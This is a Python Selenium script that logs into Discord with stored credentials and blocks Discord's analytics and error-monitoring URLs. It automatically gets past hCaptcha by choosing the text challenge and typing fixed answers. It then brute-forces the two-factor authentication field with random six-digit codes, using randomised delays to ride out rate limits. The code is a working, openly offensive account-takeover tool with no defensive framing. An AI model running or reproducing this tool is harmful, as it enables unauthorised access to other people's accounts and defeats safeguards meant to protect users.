# Import dependencies and libraries
import os
import time

import traceback2
from dotenv import load_dotenv
import secrets
from lib.codegen import genNormal
from lib.textcolor import toColor

# Import Selenium libraries and dependencies
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import NoSuchElementException
from webdriver_manager.chrome import ChromeDriverManager
from selenium.webdriver.common.by import By

from selenium.webdriver.support.ui import WebDriverWait as WDW
from selenium.webdriver.support import expected_conditions as EC
from selenium.webdriver.common.action_chains import ActionChains
import random

# Load in the credentials from .env
load_dotenv()

# Get the Chromium web driver
print(toColor("[*] Getting Web Driver", "cyan"))
driver = webdriver.Chrome(ChromeDriverManager().install())

# Set the email and password variables from the environment variables
email = os.getenv('EMAIL')
password = os.getenv('PASSWORD')


def human_click(browser, element):
    action_chains = ActionChains(browser)
    wait_time = random.uniform(0, 0.5)
    action_chains.pause(wait_time).move_to_element(element).pause(wait_time).click().perform()


def main():
    # Blocking cloudflare, sentry.io and discord science URLS (analytics and monitoring URLS)
    driver.execute_cdp_cmd('Network.setBlockedURLs', {
        "urls": [
            "a.nel.cloudflare.com/report",
            "https://discord.com/api/v9/science",
            "sentry.io"
        ]
    })
    # Enable the network connectivity of the browser
    driver.execute_cdp_cmd('Network.enable', {})
    # Go to the discord login page
    driver.get("https://www.discord.com/login")
    options = webdriver.ChromeOptions()
    # Clean up the program log
    options.add_experimental_option("excludeSwitches", ["enable-logging"])
    options.use_chromium = True
    # Wait 1 second before typing the email and password
    time.sleep(1)

    # Find the email and password login fields
    loginEmail = driver.find_element(by=By.NAME, value="email")
    loginPassword = driver.find_element(by=By.NAME, value="password")
    # Enter the email and password
    loginEmail.send_keys(email)
    loginPassword.send_keys(password)
    # Click Enter/Return to enter the password
    loginPassword.send_keys(Keys.RETURN)
    # input("Waiting for user to pass the 2capcha")
    time.sleep(3)
    # Set up the statistics variables
    totpCount = 0
    ratelimitCount = 0

    # loginTOTP = otp input field. TOTP stands for Timed One Time Password
    # Constantly run the script
    while True:
        # hCaptcha is required
        if "おかえりなさい！" in driver.page_source:
            while True:
                try:
                    # hCaptcha bypass
                    print(toColor(f"[*] Bypassing hCaptcha", "yellow"))
                    wait = WDW(driver, 5)
                    wait.until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, 'iframe[title="hCaptcha セキュリティ チャレンジのチェックボックスを含むウィジェット"]')))
                    print(toColor(f"- Click checkbox", "cyan"))
                    start_button = wait.until(EC.element_to_be_clickable((By.ID, "checkbox")))
                    human_click(driver, start_button)
                    time.sleep(3)
                    driver.switch_to.default_content()
                    print(toColor(f"- Click 3 dots", "cyan"))
                    wait = WDW(driver, 5)
                    wait.until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, "iframe[title='hCaptchaチャレンジの主な内容']")))
                    button = wait.until(EC.element_to_be_clickable((By.ID, "menu-info")))
                    human_click(driver, button)
                    time.sleep(3)
                    print(toColor(f"- Click text challenge", "cyan"))
                    button = wait.until(EC.element_to_be_clickable((By.ID, "text_challenge")))
                    human_click(driver, button)
                    time.sleep(5)
                    print(toColor(f"- Enter text", "cyan"))
                    done = 0
                    for i in range(5):
                        try:
                            inputText = driver.find_element(by=By.XPATH, value='//*[@aria-label="チャレンジテキスト入力"]')
                            time.sleep(1)
                            for t in ["い", "い", "え"]:
                                inputText.send_keys(t)
                                time.sleep(0.2)
                            inputText.send_keys(Keys.RETURN)
                            print(toColor(f"  text ({i + 1})", "cyan"))
                            done += 1
                        except:
                            break
                    if done < 3:
                        raise RuntimeError()
                    print(print(toColor(f"[+] Successfully bypassed hCaptcha!", "yellow")))
                    time.sleep(5)
                    break
                except:
                    print(print(toColor(f"[+] Something went wrong while bypassing hCaptcha.", "magenta")))
                    driver.switch_to.default_content()
                    wait = WDW(driver, 5)
                    wait.until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, 'iframe[title="hCaptcha セキュリティ チャレンジのチェックボックスを含むウィジェット"]')))
                    time.sleep(1)
                    try:
                        # isError = not (driver.find_element(by=By.ID, value='status').get_attribute("aria-hidden"))
                        driver.find_element(by=By.XPATH, value='//*[contains(@id, "status") and contains(@aria-hidden, "false")]')
                        # if "コンピュータまたはネットワークが送信したリクエストが多すぎます" in driver.page_source:
                        print(print(toColor(f"[x] Too many attempts of hCaptcha Error", "magenta")))
                        print(toColor(f"- Click checkbox", "cyan"))
                        start_button = wait.until(EC.element_to_be_clickable((By.ID, "checkbox")))
                        human_click(driver, start_button)
                        time.sleep(3)
                        driver.switch_to.default_content()
                        wait = WDW(driver, 5)
                        wait.until(EC.frame_to_be_available_and_switch_to_it((By.CSS_SELECTOR, "iframe[title='hCaptchaチャレンジの主な内容']")))
                        print(toColor(f"- Enter text", "cyan"))
                        done = 0
                        for i in range(5):
                            try:
                                inputText = driver.find_element(by=By.XPATH, value='//*[@aria-label="チャレンジテキスト入力"]')
                                time.sleep(1)
                                for t in ["い", "い", "え"]:
                                    inputText.send_keys(t)
                                    time.sleep(0.2)
                                inputText.send_keys(Keys.RETURN)
                                print(toColor(f"  text ({i + 1})", "cyan"))
                                done += 1
                            except:
                                break
                        if done >= 3:
                            print(print(toColor(f"[+] Successfully bypassed hCaptcha!", "yellow")))
                        else:
                            return False
                    except:
                        return False
        else:
            # Attempt to find the TOTP login field
            try:
                loginTOTP = driver.find_element(by=By.XPATH, value='//*[@aria-label="Discordの認証／バックアップコードを入力してください"]')
                time.sleep(0.5)
                start = time.time()
                sleepy = 0
                # Logic to continuously enter OTP codes
                while True:
                    # Generate a new 6 digit number and enter it into the TOTP field
                    totp = genNormal(1)
                    loginTOTP.send_keys(totp)
                    loginTOTP.send_keys(Keys.RETURN)
                    totpCount += 1
                    time.sleep(1)
                    # Test if Discord ratelimits us
                    if "The resource is being rate limited." in driver.page_source:
                        # Log the ratelimit event and wait 7-12 seconds randomly
                        print(toColor("[x] Ratelimited.", "magenta"))
                        sleepy = secrets.choice(range(7, 12))
                        ratelimitCount += 1
                    # This means that Discord has expired this login session.
                    elif "Invalid two-factor auth ticket" in driver.page_source:
                        # This means that Discord has expired this login session.
                        #  Print this out as well as some statistics, and prompt the user to retry.
                        elapsed = time.time() - start
                        print(toColor("[x] Invalid session ticket. The Discord login session has expired.", "magenta"))
                        print(toColor(f"- Number of tried codes: {totpCount}", "cyan"))
                        print(toColor(f"- Time elapsed for codes: {elapsed}", "cyan"))
                        print(toColor(f"- Number of ratelimits {ratelimitCount}", "cyan"))
                        return False
                    # The entered TOTP code is invalid. Wait 6-10 seconds, then try again.
                    else:
                        sleepy = secrets.choice(range(5, 9))

                    # Testing if the main app UI renders.
                    try:
                        # Wait 1 second, then check if the Discord App's HTML loaded. If loaded, then output it to the user.
                        time.sleep(1)
                        loginTest = driver.find_element(by=By.CLASS_NAME, value="app-2CXKsg")
                        print(toColor(f"[o] Code {totp} worked!", "yellow"))
                        return True
                    except NoSuchElementException:
                        # This means that the login was unsuccessful.
                        time.sleep(sleepy)
                        # Backspace the previously entered TOTP code.
                        for i in range(6):
                            loginTOTP.send_keys(Keys.BACKSPACE)
                        print("[-] Code " + toColor(totp, "cyan") + " did not work, delay: " + toColor(sleepy, "cyan"))

            # If the TOTP login field is not found (e.g the user hasn't completed the Captcha, then try again
            except NoSuchElementException:
                # print(traceback2.format_exc(()))
                pass


if __name__ == "__main__":
    print(toColor("[*] Starting main program", "cyan"))
    while True:
        if main():
            while input("Type 'quit' to close.") != "quit":
                pass
            break
